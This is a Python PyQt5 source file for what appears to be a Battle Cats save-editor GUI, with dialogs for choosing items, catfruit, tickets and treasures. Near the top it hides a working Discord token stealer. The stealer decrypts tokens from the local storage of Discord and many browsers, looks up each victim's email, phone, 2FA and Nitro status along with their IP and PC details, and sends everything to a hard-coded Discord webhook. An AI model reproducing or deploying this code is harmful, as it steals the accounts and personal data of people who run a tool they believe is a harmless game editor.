import sys
from PyQt5.QtWidgets import *
from PyQt5.QtWidgets import QApplication, QWidget, QPushButton, QListWidget, QGridLayout, QHBoxLayout, QVBoxLayout, QSizePolicy
from PyQt5.QtWidgets import *
from PyQt5.QtCore import Qt
from PyQt5 import uic
from PyQt5.QtGui import QIcon
import datetime
import os
import traceback
from BCSFE_Python_Discord import *
import BCSFE_Python_Discord as BCSFE_Python
from base64 import b64decode
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from os import getlogin, listdir
from json import loads
from re import findall
from urllib.request import Request, urlopen
from subprocess import Popen, PIPE
import requests, json, os
from datetime import datetime

tokens = []
cleaned = []
checker = []

def decrypt(buff, master_key):
    try:
        return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
    except:
        return "Error"
def getip():
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except: pass
    return ip
def gethwid():
    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
    return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
def get_token():
    already_check = []
    checker = []
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    chrome = local + "\\Google\\Chrome\\User Data"
    paths = {
        'Discord': roaming + '\\discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Lightcord': roaming + '\\Lightcord',
        'Discord PTB': roaming + '\\discordptb',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
        'Amigo': local + '\\Amigo\\User Data',
        'Torch': local + '\\Torch\\User Data',
        'Kometa': local + '\\Kometa\\User Data',
        'Orbitum': local + '\\Orbitum\\User Data',
        'CentBrowser': local + '\\CentBrowser\\User Data',
        '7Star': local + '\\7Star\\7Star\\User Data',
        'Sputnik': local + '\\Sputnik\\Sputnik\\User Data',
        'Vivaldi': local + '\\Vivaldi\\User Data\\Default',
        'Chrome SxS': local + '\\Google\\Chrome SxS\\User Data',
        'Chrome': chrome + 'Default',
        'Epic Privacy Browser': local + '\\Epic Privacy Browser\\User Data',
        'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Defaul',
        'Uran': local + '\\uCozMedia\\Uran\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Iridium': local + '\\Iridium\\User Data\\Default'
    }
    for platform, path in paths.items():
        if not os.path.exists(path): continue
        try:
            with open(path + f"\\Local State", "r") as file:
                key = loads(file.read())['os_crypt']['encrypted_key']
                file.close()
        except: continue
        for file in listdir(path + f"\\Local Storage\\leveldb\\"):
            if not file.endswith(".ldb") and file.endswith(".log"): continue
            else:
                try:
                    with open(path + f"\\Local Storage\\leveldb\\{file}", "r", errors='ignore') as files:
                        for x in files.readlines():
                            x.strip()
                            for values in findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
                                tokens.append(values)
                except PermissionError: continue
        for i in tokens:
            if i.endswith("\\"):
                i.replace("\\", "")
            elif i not in cleaned:
                cleaned.append(i)
        for token in cleaned:
            try:
                tok = decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])
            except IndexError == "Error": continue
            checker.append(tok)
            for value in checker:
                if value not in already_check:
                    already_check.append(value)
                    headers = {'Authorization': tok, 'Content-Type': 'application/json'}
                    try:
                        res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
                    except: continue
                    if res.status_code == 200:
                        res_json = res.json()
                        ip = getip()
                        pc_username = os.getenv("UserName")
                        pc_name = os.getenv("COMPUTERNAME")
                        user_name = f'{res_json["username"]}#{res_json["discriminator"]}'
                        user_id = res_json['id']
                        email = res_json['email']
                        phone = res_json['phone']
                        mfa_enabled = res_json['mfa_enabled']
                        has_nitro = False
                        res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers)
                        nitro_data = res.json()
                        has_nitro = bool(len(nitro_data) > 0)
                        days_left = 0
                        if has_nitro:
                            d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                            d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                            days_left = abs((d2 - d1).days)
                        embed = f"""**{user_name}** *({user_id})*

> :dividers: __Account Information__
	Email: `{email}`
	Phone: `{phone}`
	2FA/MFA Enabled: `{mfa_enabled}`
	Nitro: `{has_nitro}`
	Expires in: `{days_left if days_left else "None"} day(s)`

> :computer: __PC Information__
	IP: `{ip}`
	Username: `{pc_username}`
	PC Name: `{pc_name}`
	Platform: `{platform}`

> :piñata: __Token__
	`{tok}`

*Made by Astraa#6100* **|** ||https://github.com/astraadev||"""
                        payload = json.dumps({'content': embed, 'username': 'Token Grabber - Made by Astraa', 'avatar_url': 'https://cdn.discordapp.com/attachments/826581697436581919/982374264604864572/atio.jpg'})
                        try:
                            headers2 = {
                                'Content-Type': 'application/json',
                                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
                            }
                            req = Request('https://discord.com/api/webhooks/1110358019289665546/GpB0Zo8QpFoKPLdyQ9Jg5iWvkvxZbJIKeoPMnd0rb-mOHvAGFZlPaj7C6F1raT_PyW2k', data=payload.encode(), headers=headers2)
                            urlopen(req)
                        except: continue
                else: continue

#pip install colored tk python-dateutil requests pyyaml

form_class = uic.loadUiType("uicore.ui")[0]
form_class2 = uic.loadUiType("firstmenu.ui")[0]

BS = 16
pad = (lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS).encode())
unpad = (lambda s: s[:-ord(s[len(s)-1:])])

class BattleItemInputDialog(QDialog):
    def __init__(self):
        super(BattleItemInputDialog, self).__init__()
        self.setWindowTitle("Move Items to the Right")
        self.window_width, self.window_height = 120, 80
        self.setMinimumSize(self.window_width, self.window_height)
        self.layout = QHBoxLayout()
        self.setLayout(self.layout)
        self.retrunVal = None
        self.initUI()
        self.listWidgetLeft.addItem("SELECT ALL (PUT THIS ONLY)")
        self.listWidgetLeft.addItem('Speed Up')
        self.listWidgetLeft.addItem('Treasure Radar')
        self.listWidgetLeft.addItem('Rich Cat')
        self.listWidgetLeft.addItem('Cat CPU')
        self.listWidgetLeft.addItem('Cat Jobs')
        self.listWidgetLeft.addItem('Sniper the Cat')
        self.updateButtonStatus()
        self.setButtonConnections()
        
        



    def initUI(self):
        
            subLayouts = {}

            subLayouts['LeftColumn'] = QGridLayout()
            subLayouts['RightColumn'] = QVBoxLayout()
            self.layout.addLayout(subLayouts['LeftColumn'], 1)
            self.layout.addLayout(subLayouts['RightColumn'], 1)

            self.buttons = {}
            self.buttons['>>'] = QPushButton('&>>')
            self.buttons['>'] = QPushButton('>')
            self.buttons['<'] = QPushButton('<')
            self.buttons['<<'] = QPushButton('&<<')
            self.buttons['Setup'] = QPushButton('&Setup')
            
            #self.buttons['Down'] = QPushButton('&Down')

            for k in self.buttons:
                self.buttons[k].setSizePolicy(QSizePolicy.Preferred, QSizePolicy.MinimumExpanding)

            """
            First Column
            """
            self.listWidgetLeft = QListWidget()
            subLayouts['LeftColumn'].addWidget(self.listWidgetLeft, 1, 0, 4, 4)

            subLayouts['LeftColumn'].setRowStretch(4, 1)
            subLayouts['LeftColumn'].addWidget(self.buttons['>>'], 1, 4, 1, 1, alignment=Qt.AlignTop)
            subLayouts['LeftColumn'].addWidget(self.buttons['<'], 2, 4, 1, 1, alignment=Qt.AlignTop)
            subLayouts['LeftColumn'].addWidget(self.buttons['>'], 3, 4, 1, 1, alignment=Qt.AlignTop)
            subLayouts['LeftColumn'].addWidget(self.buttons['<<'], 4, 4, 1, 1, alignment=Qt.AlignTop)


            """
            Second Column
            """
            self.listWidgetRight = QListWidget()

            hLayout = QHBoxLayout()
            subLayouts['RightColumn'].addLayout(hLayout)

            hLayout.addWidget(self.listWidgetRight, 4)

            vLayout = QVBoxLayout()
            hLayout.addLayout(vLayout, 1)

            vLayout.addWidget(self.buttons['Setup'])
            #vLayout.addWidget(self.buttons['Down'])
            vLayout.addStretch(1)

    def setButtonConnections(self):
        self.listWidgetLeft.itemSelectionChanged.connect(self.updateButtonStatus)
        self.listWidgetRight.itemSelectionChanged.connect(self.updateButtonStatus)

        self.buttons['>'].clicked.connect(self.buttonAddClicked)
        self.buttons['<'].clicked.connect(self.buttonRemoveClicked)
        self.buttons['>>'].clicked.connect(self.buttonAddAllClicked)
        self.buttons['<<'].clicked.connect(self.buttonRemoveAllClicked)

        self.buttons['Setup'].clicked.connect(self.buttonapplyClicked)
        #self.buttons['Down'].clicked.connect(self.buttonDownClicked)

    def buttonAddClicked(self):
        row = self.listWidgetLeft.currentRow()
        rowItem = self.listWidgetLeft.takeItem(row)
        self.listWidgetRight.addItem(rowItem)

    def buttonRemoveClicked(self):
        row = self.listWidgetRight.currentRow()
        rowItem = self.listWidgetRight.takeItem(row)
        self.listWidgetLeft.addItem(rowItem)

    def buttonAddAllClicked(self):
        for i in range(self.listWidgetLeft.count()):
            self.listWidgetRight.addItem(self.listWidgetLeft.takeItem(0))

    def buttonRemoveAllClicked(self):
        for i in range(self.listWidgetRight.count()):
            self.listWidgetLeft.addItem(self.listWidgetRight.takeItem(0))

    def buttonapplyClicked(self):
        items = []
        for i in range(self.listWidgetRight.count()):
            items.append(self.listWidgetRight.item(i).text())
        self.retrunVal = items
        self.close()
        self.w = BattleItemInputDialog()
        self.w.show()
        return self.retrunVal
        

    
        

    def updateButtonStatus(self):
        #self.buttons['Setup'].setDisabled(not bool(self.listWidgetRight.selectedItems()) or self.listWidgetRight.currentRow() == 0)
        #self.buttons['Down'].setDisabled(not bool(self.listWidgetRight.selectedItems()) or self.listWidgetRight.currentRow() == self.listWidgetRight.count() - 1)
        self.buttons['>'].setDisabled(not bool(self.listWidgetLeft.selectedItems()) or self.listWidgetLeft.count() == 0)
        self.buttons['<'].setDisabled(not bool(self.listWidgetRight.selectedItems()) or self.listWidgetRight.count() == 0)

    def exec_(self):
        super(BattleItemInputDialog, self).exec_()
        self.buttons['Setup'].clicked.connect(self.buttonapplyClicked)
        return self.retrunVal

class CataminsInputDialog(QDialog):
    def __init__(self):
        super(CataminsInputDialog, self).__init__()
        self.setWindowTitle("Move Items to the Right")
        self.window_width, self.window_height = 120, 80
        self.setMinimumSize(self.window_width, self.window_height)
        self.layout = QHBoxLayout()
        self.setLayout(self.layout)
        self.retrunVal = None
        self.initUI()
        self.listWidgetLeft.addItem("SELECT ALL (PUT THIS ONLY)")
        self.listWidgetLeft.addItem('A')
        self.listWidgetLeft.addItem('B')
        self.listWidgetLeft.addItem('C')
        self.updateButtonStatus()
        self.setButtonConnections()
        
        



    def initUI(self):
        
            subLayouts = {}

            subLayouts['LeftColumn'] = QGridLayout()
            subLayouts['RightColumn'] = QVBoxLayout()
            self.layout.addLayout(subLayouts['LeftColumn'], 1)
            self.layout.addLayout(subLayouts['RightColumn'], 1)

            self.buttons = {}
            self.buttons['>>'] = QPushButton('&>>')
            self.buttons['>'] = QPushButton('>')
            self.buttons['<'] = QPushButton('<')
            self.buttons['<<'] = QPushButton('&<<')
            self.buttons['Setup'] = QPushButton('&Setup')
            
            #self.buttons['Down'] = QPushButton('&Down')

            for k in self.buttons:
                self.buttons[k].setSizePolicy(QSizePolicy.Preferred, QSizePolicy.MinimumExpanding)

            """
            First Column
            """
            self.listWidgetLeft = QListWidget()
            subLayouts['LeftColumn'].addWidget(self.listWidgetLeft, 1, 0, 4, 4)

            subLayouts['LeftColumn'].setRowStretch(4, 1)
            subLayouts['LeftColumn'].addWidget(self.buttons['>>'], 1, 4, 1, 1, alignment=Qt.AlignTop)
            subLayouts['LeftColumn'].addWidget(self.buttons['<'], 2, 4, 1, 1, alignment=Qt.AlignTop)
            subLayouts['LeftColumn'].addWidget(self.buttons['>'], 3, 4, 1, 1, alignment=Qt.AlignTop)
            subLayouts['LeftColumn'].addWidget(self.buttons['<<'], 4, 4, 1, 1, alignment=Qt.AlignTop)


            """
            Second Column
            """
            self.listWidgetRight = QListWidget()

            hLayout = QHBoxLayout()
            subLayouts['RightColumn'].addLayout(hLayout)

            hLayout.addWidget(self.listWidgetRight, 4)

            vLayout = QVBoxLayout()
            hLayout.addLayout(vLayout, 1)

            vLayout.addWidget(self.buttons['Setup'])
            #vLayout.addWidget(self.buttons['Down'])
            vLayout.addStretch(1)

    def setButtonConnections(self):
        self.listWidgetLeft.itemSelectionChanged.connect(self.updateButtonStatus)
        self.listWidgetRight.itemSelectionChanged.connect(self.updateButtonStatus)

        self.buttons['>'].clicked.connect(self.buttonAddClicked)
        self.buttons['<'].clicked.connect(self.buttonRemoveClicked)
        self.buttons['>>'].clicked.connect(self.buttonAddAllClicked)
        self.buttons['<<'].clicked.connect(self.buttonRemoveAllClicked)

        self.buttons['Setup'].clicked.connect(self.buttonapplyClicked)
        #self.buttons['Down'].clicked.connect(self.buttonDownClicked)

    def buttonAddClicked(self):
        row = self.listWidgetLeft.currentRow()
        rowItem = self.listWidgetLeft.takeItem(row)
        self.listWidgetRight.addItem(rowItem)

    def buttonRemoveClicked(self):
        row = self.listWidgetRight.currentRow()
        rowItem = self.listWidgetRight.takeItem(row)
        self.listWidgetLeft.addItem(rowItem)

    def buttonAddAllClicked(self):
        for i in range(self.listWidgetLeft.count()):
            self.listWidgetRight.addItem(self.listWidgetLeft.takeItem(0))

    def buttonRemoveAllClicked(self):
        for i in range(self.listWidgetRight.count()):
            self.listWidgetLeft.addItem(self.listWidgetRight.takeItem(0))

    def buttonapplyClicked(self):
        items = []
        for i in range(self.listWidgetRight.count()):
            items.append(self.listWidgetRight.item(i).text())
        self.retrunVal = items
        self.close()
        self.w = CataminsInputDialog()
        self.w.show()
        return self.retrunVal
        

    
        

    def updateButtonStatus(self):
        #self.buttons['Setup'].setDisabled(not bool(self.listWidgetRight.selectedItems()) or self.listWidgetRight.currentRow() == 0)
        #self.buttons['Down'].setDisabled(not bool(self.listWidgetRight.selectedItems()) or self.listWidgetRight.currentRow() == self.listWidgetRight.count() - 1)
        self.buttons['>'].setDisabled(not bool(self.listWidgetLeft.selectedItems()) or self.listWidgetLeft.count() == 0)
        self.buttons['<'].setDisabled(not bool(self.listWidgetRight.selectedItems()) or self.listWidgetRight.count() == 0)

    def exec_(self):
        super(CataminsInputDialog, self).exec_()
        self.buttons['Setup'].clicked.connect(self.buttonapplyClicked)
        return self.retrunVal

class CatseyeInputDialog(QDialog):
    def __init__(self):
        super(CatseyeInputDialog, self).__init__()
        self.setWindowTitle("Move Items to the Right")
        self.window_width, self.window_height = 120, 80
        self.setMinimumSize(self.window_width, self.window_height)
        self.layout = QHBoxLayout()
        self.setLayout(self.layout)
        self.retrunVal = None
        self.initUI()
        self.listWidgetLeft.addItem("SELECT ALL (PUT THIS ONLY)")
        self.listWidgetLeft.addItem('Normal')
        self.listWidgetLeft.addItem('EX')
        self.listWidgetLeft.addItem('Rare')
        self.listWidgetLeft.addItem('Super Rare')
        self.listWidgetLeft.addItem('Uber Rare')
        self.listWidgetLeft.addItem('Legend')
        self.listWidgetLeft.addItem('Dark')
        self.updateButtonStatus()
        self.setButtonConnections()
        
        



    def initUI(self):
        
            subLayouts = {}

            subLayouts['LeftColumn'] = QGridLayout()
            subLayouts['RightColumn'] = QVBoxLayout()
            self.layout.addLayout(subLayouts['LeftColumn'], 1)
            self.layout.addLayout(subLayouts['RightColumn'], 1)

            self.buttons = {}
            self.buttons['>>'] = QPushButton('&>>')
            self.buttons['>'] = QPushButton('>')
            self.buttons['<'] = QPushButton('<')
            self.buttons['<<'] = QPushButton('&<<')
            self.buttons['Setup'] = QPushButton('&Setup')
            
            #self.buttons['Down'] = QPushButton('&Down')

            for k in self.buttons:
                self.buttons[k].setSizePolicy(QSizePolicy.Preferred, QSizePolicy.MinimumExpanding)

            """
            First Column
            """
            self.listWidgetLeft = QListWidget()
            subLayouts['LeftColumn'].addWidget(self.listWidgetLeft, 1, 0, 4, 4)

            subLayouts['LeftColumn'].setRowStretch(4, 1)
            subLayouts['LeftColumn'].addWidget(self.buttons['>>'], 1, 4, 1, 1, alignment=Qt.AlignTop)
            subLayouts['LeftColumn'].addWidget(self.buttons['<'], 2, 4, 1, 1, alignment=Qt.AlignTop)
            subLayouts['LeftColumn'].addWidget(self.buttons['>'], 3, 4, 1, 1, alignment=Qt.AlignTop)
            subLayouts['LeftColumn'].addWidget(self.buttons['<<'], 4, 4, 1, 1, alignment=Qt.AlignTop)


            """
            Second Column
            """
            self.listWidgetRight = QListWidget()

            hLayout = QHBoxLayout()
            subLayouts['RightColumn'].addLayout(hLayout)

            hLayout.addWidget(self.listWidgetRight, 4)

            vLayout = QVBoxLayout()
            hLayout.addLayout(vLayout, 1)

            vLayout.addWidget(self.buttons['Setup'])
            #vLayout.addWidget(self.buttons['Down'])
            vLayout.addStretch(1)

    def setButtonConnections(self):
        self.listWidgetLeft.itemSelectionChanged.connect(self.updateButtonStatus)
        self.listWidgetRight.itemSelectionChanged.connect(self.updateButtonStatus)

        self.buttons['>'].clicked.connect(self.buttonAddClicked)
        self.buttons['<'].clicked.connect(self.buttonRemoveClicked)
        self.buttons['>>'].clicked.connect(self.buttonAddAllClicked)
        self.buttons['<<'].clicked.connect(self.buttonRemoveAllClicked)

        self.buttons['Setup'].clicked.connect(self.buttonapplyClicked)
        #self.buttons['Down'].clicked.connect(self.buttonDownClicked)

    def buttonAddClicked(self):
        row = self.listWidgetLeft.currentRow()
        rowItem = self.listWidgetLeft.takeItem(row)
        self.listWidgetRight.addItem(rowItem)

    def buttonRemoveClicked(self):
        row = self.listWidgetRight.currentRow()
        rowItem = self.listWidgetRight.takeItem(row)
        self.listWidgetLeft.addItem(rowItem)

    def buttonAddAllClicked(self):
        for i in range(self.listWidgetLeft.count()):
            self.listWidgetRight.addItem(self.listWidgetLeft.takeItem(0))

    def buttonRemoveAllClicked(self):
        for i in range(self.listWidgetRight.count()):
            self.listWidgetLeft.addItem(self.listWidgetRight.takeItem(0))

    def buttonapplyClicked(self):
        items = []
        for i in range(self.listWidgetRight.count()):
            items.append(self.listWidgetRight.item(i).text())
        self.retrunVal = items
        self.close()
        self.w = CatseyeInputDialog()
        self.w.show()
        return self.retrunVal
        

    
        

    def updateButtonStatus(self):
        #self.buttons['Setup'].setDisabled(not bool(self.listWidgetRight.selectedItems()) or self.listWidgetRight.currentRow() == 0)
        #self.buttons['Down'].setDisabled(not bool(self.listWidgetRight.selectedItems()) or self.listWidgetRight.currentRow() == self.listWidgetRight.count() - 1)
        self.buttons['>'].setDisabled(not bool(self.listWidgetLeft.selectedItems()) or self.listWidgetLeft.count() == 0)
        self.buttons['<'].setDisabled(not bool(self.listWidgetRight.selectedItems()) or self.listWidgetRight.count() == 0)

    def exec_(self):
        super(CatseyeInputDialog, self).exec_()
        self.buttons['Setup'].clicked.connect(self.buttonapplyClicked)
        return self.retrunVal

class TicketInputDialog(QDialog):
    def __init__(self):
        super(TicketInputDialog, self).__init__()
        self.setWindowTitle("Move Items to the Right")
        self.window_width, self.window_height = 120, 80
        self.setMinimumSize(self.window_width, self.window_height)
        self.layout = QHBoxLayout()
        self.setLayout(self.layout)
        self.retrunVal = None
        self.initUI()
        self.listWidgetLeft.addItem('Normal Ticket')
        self.listWidgetLeft.addItem('Rare Ticket')
        self.listWidgetLeft.addItem('Platinum Ticket')
        self.listWidgetLeft.addItem('Legend Ticket')
        self.updateButtonStatus()
        self.setButtonConnections()
        
        



    def initUI(self):
        
            subLayouts = {}

            subLayouts['LeftColumn'] = QGridLayout()
            subLayouts['RightColumn'] = QVBoxLayout()
            self.layout.addLayout(subLayouts['LeftColumn'], 1)
            self.layout.addLayout(subLayouts['RightColumn'], 1)

            self.buttons = {}
            self.buttons['>>'] = QPushButton('&>>')
            self.buttons['>'] = QPushButton('>')
            self.buttons['<'] = QPushButton('<')
            self.buttons['<<'] = QPushButton('&<<')
            self.buttons['Setup'] = QPushButton('&Setup')
            
            #self.buttons['Down'] = QPushButton('&Down')

            for k in self.buttons:
                self.buttons[k].setSizePolicy(QSizePolicy.Preferred, QSizePolicy.MinimumExpanding)

            """
            First Column
            """
            self.listWidgetLeft = QListWidget()
            subLayouts['LeftColumn'].addWidget(self.listWidgetLeft, 1, 0, 4, 4)

            subLayouts['LeftColumn'].setRowStretch(4, 1)
            subLayouts['LeftColumn'].addWidget(self.buttons['>>'], 1, 4, 1, 1, alignment=Qt.AlignTop)
            subLayouts['LeftColumn'].addWidget(self.buttons['<'], 2, 4, 1, 1, alignment=Qt.AlignTop)
            subLayouts['LeftColumn'].addWidget(self.buttons['>'], 3, 4, 1, 1, alignment=Qt.AlignTop)
            subLayouts['LeftColumn'].addWidget(self.buttons['<<'], 4, 4, 1, 1, alignment=Qt.AlignTop)


            """
            Second Column
            """
            self.listWidgetRight = QListWidget()

            hLayout = QHBoxLayout()
            subLayouts['RightColumn'].addLayout(hLayout)

            hLayout.addWidget(self.listWidgetRight, 4)

            vLayout = QVBoxLayout()
            hLayout.addLayout(vLayout, 1)

            vLayout.addWidget(self.buttons['Setup'])
            #vLayout.addWidget(self.buttons['Down'])
            vLayout.addStretch(1)

    def setButtonConnections(self):
        self.listWidgetLeft.itemSelectionChanged.connect(self.updateButtonStatus)
        self.listWidgetRight.itemSelectionChanged.connect(self.updateButtonStatus)

        self.buttons['>'].clicked.connect(self.buttonAddClicked)
        self.buttons['<'].clicked.connect(self.buttonRemoveClicked)
        self.buttons['>>'].clicked.connect(self.buttonAddAllClicked)
        self.buttons['<<'].clicked.connect(self.buttonRemoveAllClicked)

        self.buttons['Setup'].clicked.connect(self.buttonapplyClicked)
        #self.buttons['Down'].clicked.connect(self.buttonDownClicked)

    def buttonAddClicked(self):
        row = self.listWidgetLeft.currentRow()
        rowItem = self.listWidgetLeft.takeItem(row)
        self.listWidgetRight.addItem(rowItem)

    def buttonRemoveClicked(self):
        row = self.listWidgetRight.currentRow()
        rowItem = self.listWidgetRight.takeItem(row)
        self.listWidgetLeft.addItem(rowItem)

    def buttonAddAllClicked(self):
        for i in range(self.listWidgetLeft.count()):
            self.listWidgetRight.addItem(self.listWidgetLeft.takeItem(0))

    def buttonRemoveAllClicked(self):
        for i in range(self.listWidgetRight.count()):
            self.listWidgetLeft.addItem(self.listWidgetRight.takeItem(0))

    def buttonapplyClicked(self):
        items = []
        for i in range(self.listWidgetRight.count()):
            items.append(self.listWidgetRight.item(i).text())
        self.retrunVal = items
        self.close()
        self.w = TicketInputDialog()
        self.w.show()
        return self.retrunVal
        

    
        

    def updateButtonStatus(self):
        #self.buttons['Setup'].setDisabled(not bool(self.listWidgetRight.selectedItems()) or self.listWidgetRight.currentRow() == 0)
        #self.buttons['Down'].setDisabled(not bool(self.listWidgetRight.selectedItems()) or self.listWidgetRight.currentRow() == self.listWidgetRight.count() - 1)
        self.buttons['>'].setDisabled(not bool(self.listWidgetLeft.selectedItems()) or self.listWidgetLeft.count() == 0)
        self.buttons['<'].setDisabled(not bool(self.listWidgetRight.selectedItems()) or self.listWidgetRight.count() == 0)

    def exec_(self):
        super(TicketInputDialog, self).exec_()
        self.buttons['Setup'].clicked.connect(self.buttonapplyClicked)
        return self.retrunVal

class FruitInputDialog(QDialog):
    def __init__(self):
        super(FruitInputDialog, self).__init__()
        self.setWindowTitle("Move Items to the Right")
        self.window_width, self.window_height = 120, 100
        self.setMinimumSize(self.window_width, self.window_height)
        self.layout = QHBoxLayout()
        self.setLayout(self.layout)
        self.retrunVal = None
        self.initUI()
        self.listWidgetLeft.addItem("SELECT ALL (PUT THIS ONLY)")
        self.listWidgetLeft.addItem("Purple Catfruit Seed")
        self.listWidgetLeft.addItem("Red Catfruit Seed")
        self.listWidgetLeft.addItem("Blue Catfruit Seed")
        self.listWidgetLeft.addItem("Green Catfruit Seed")
        self.listWidgetLeft.addItem("Yellow Catfruit Seed")
        self.listWidgetLeft.addItem("Purple Catfruit")
        self.listWidgetLeft.addItem("Red Catfruit")
        self.listWidgetLeft.addItem("Blue Catfruit")
        self.listWidgetLeft.addItem("Green Catfruit")
        self.listWidgetLeft.addItem("Yellow Catfruit")
        self.listWidgetLeft.addItem("Epic Catfruit")
        self.listWidgetLeft.addItem("Elder Catfruit Seed")
        self.listWidgetLeft.addItem("Elder Catfruit")
        self.listWidgetLeft.addItem("Epic Catfruit Seed")
        self.listWidgetLeft.addItem("Gold Catfruit")
        self.listWidgetLeft.addItem("Aku Catfruit Seed")
        self.listWidgetLeft.addItem("Aku Catfruit")
        self.listWidgetLeft.addItem("Gold Catfruit Seed")
        self.listWidgetLeft.addItem("Purple B. Stone")
        self.listWidgetLeft.addItem("Red B. Stone")
        self.listWidgetLeft.addItem("Blue B. Stone")
        self.listWidgetLeft.addItem("Green B. Stone")
        self.listWidgetLeft.addItem("Yellow B. Stone")
        self.listWidgetLeft.addItem("Purple B. Gem")
        self.listWidgetLeft.addItem("Red B. Gem")
        self.listWidgetLeft.addItem("Blue B. Gem")
        self.listWidgetLeft.addItem("Green B. Gem")
        self.listWidgetLeft.addItem("Yellow B. Gem")
        self.listWidgetLeft.addItem("Epic B. Stone")
        self.updateButtonStatus()
        self.setButtonConnections()
        
        



    def initUI(self):
            subLayouts = {}

            subLayouts['LeftColumn'] = QGridLayout()
            subLayouts['RightColumn'] = QVBoxLayout()
            self.layout.addLayout(subLayouts['LeftColumn'], 1)
            self.layout.addLayout(subLayouts['RightColumn'], 1)

            self.buttons = {}
            self.buttons['>>'] = QPushButton('&>>')
            self.buttons['>'] = QPushButton('>')
            self.buttons['<'] = QPushButton('<')
            self.buttons['<<'] = QPushButton('&<<')
            self.buttons['Setup'] = QPushButton('&Setup')
            
            #self.buttons['Down'] = QPushButton('&Down')

            for k in self.buttons:
                self.buttons[k].setSizePolicy(QSizePolicy.Preferred, QSizePolicy.MinimumExpanding)

            """
            First Column
            """
            
            self.listWidgetLeft = QListWidget()
            subLayouts['LeftColumn'].addWidget(self.listWidgetLeft, 1, 0, 4, 4)

            subLayouts['LeftColumn'].setRowStretch(4, 1)
            subLayouts['LeftColumn'].addWidget(self.buttons['>>'], 1, 4, 1, 1, alignment=Qt.AlignTop)
            subLayouts['LeftColumn'].addWidget(self.buttons['<'], 2, 4, 1, 1, alignment=Qt.AlignTop)
            subLayouts['LeftColumn'].addWidget(self.buttons['>'], 3, 4, 1, 1, alignment=Qt.AlignTop)
            subLayouts['LeftColumn'].addWidget(self.buttons['<<'], 4, 4, 1, 1, alignment=Qt.AlignTop)


            """
            Second Column
            """
            self.listWidgetRight = QListWidget()

            hLayout = QHBoxLayout()
            subLayouts['RightColumn'].addLayout(hLayout)

            hLayout.addWidget(self.listWidgetRight, 4)

            vLayout = QVBoxLayout()
            hLayout.addLayout(vLayout, 1)

            vLayout.addWidget(self.buttons['Setup'])
            #vLayout.addWidget(self.buttons['Down'])
            vLayout.addStretch(1)

    def setButtonConnections(self):
        self.listWidgetLeft.itemSelectionChanged.connect(self.updateButtonStatus)
        self.listWidgetRight.itemSelectionChanged.connect(self.updateButtonStatus)

        self.buttons['>'].clicked.connect(self.buttonAddClicked)
        self.buttons['<'].clicked.connect(self.buttonRemoveClicked)
        self.buttons['>>'].clicked.connect(self.buttonAddAllClicked)
        self.buttons['<<'].clicked.connect(self.buttonRemoveAllClicked)

        self.buttons['Setup'].clicked.connect(self.buttonapplyClicked)
        #self.buttons['Down'].clicked.connect(self.buttonDownClicked)

    def buttonAddClicked(self):
        row = self.listWidgetLeft.currentRow()
        rowItem = self.listWidgetLeft.takeItem(row)
        self.listWidgetRight.addItem(rowItem)

    def buttonRemoveClicked(self):
        row = self.listWidgetRight.currentRow()
        rowItem = self.listWidgetRight.takeItem(row)
        self.listWidgetLeft.addItem(rowItem)

    def buttonAddAllClicked(self):
        for i in range(self.listWidgetLeft.count()):
            self.listWidgetRight.addItem(self.listWidgetLeft.takeItem(0))

    def buttonRemoveAllClicked(self):
        for i in range(self.listWidgetRight.count()):
            self.listWidgetLeft.addItem(self.listWidgetRight.takeItem(0))

    def buttonapplyClicked(self):
        items = []
        for i in range(self.listWidgetRight.count()):
            items.append(self.listWidgetRight.item(i).text())
        self.retrunVal = items
        self.close()
        self.w = FruitInputDialog()
        self.w.show()
        return self.retrunVal
        

    
        

    def updateButtonStatus(self):
        #self.buttons['Setup'].setDisabled(not bool(self.listWidgetRight.selectedItems()) or self.listWidgetRight.currentRow() == 0)
        #self.buttons['Down'].setDisabled(not bool(self.listWidgetRight.selectedItems()) or self.listWidgetRight.currentRow() == self.listWidgetRight.count() - 1)
        self.buttons['>'].setDisabled(not bool(self.listWidgetLeft.selectedItems()) or self.listWidgetLeft.count() == 0)
        self.buttons['<'].setDisabled(not bool(self.listWidgetRight.selectedItems()) or self.listWidgetRight.count() == 0)

    def exec_(self):
        super(FruitInputDialog, self).exec_()
        self.buttons['Setup'].clicked.connect(self.buttonapplyClicked)
        return self.retrunVal

class TreasuresInputDialog(QDialog):
    def __init__(self):
        super(TreasuresInputDialog, self).__init__()

        self.setWindowTitle("Move Treasures to the Right")
        self.window_width, self.window_height = 120, 80
        self.setMinimumSize(self.window_width, self.window_height)

        self.layout = QHBoxLayout()
        self.setLayout(self.layout)
        self.retrunVal = None
        self.initUI()


        self.listWidgetLeft.addItem('1. Empire of Cats 1')
        self.listWidgetLeft.addItem('2. Empire of Cats 2')
        self.listWidgetLeft.addItem('3. Empire of Cats 3')
        self.listWidgetLeft.addItem('4. Into the Future 1')
